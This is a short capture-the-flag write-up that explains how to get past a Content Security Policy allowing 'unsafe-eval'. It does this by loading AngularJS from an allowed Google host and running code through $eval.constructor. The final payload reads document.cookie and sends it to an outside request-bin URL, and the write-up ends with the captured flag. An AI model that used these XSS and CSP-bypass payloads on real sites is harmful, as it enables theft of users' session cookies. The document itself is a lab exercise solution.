CSP policy:
"""default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self'
 https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'"""


since there is 'unsafe-eval' in CSP policy, I have to use the function eval() in the script, like in this example (taken from the internet):
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

the only script from the page https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt that works in this situation is the following:
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>

so I adapt it to the situation, because of the presence of the 'unsafe-eval'.
the CSP accepts scripts from the source https://ajax.googleapis.com, so I adapt it as the following:
"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

now I just have to replace 'alert(1)' with the script that is necessary to make a request to the requestbin.
The following is the working one!
"><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script> <div ng-app ng-csp>{{$eval.constructor('url = "https://enzd6cmhoggppqb.m.pipedream.net/"; url_completo = url.concat(document.cookie); window.open(url_completo)')()}}</div>

now I take the flag from the requestbin :)

flag{th1s1s_how_w3_byp4ss3d_csp}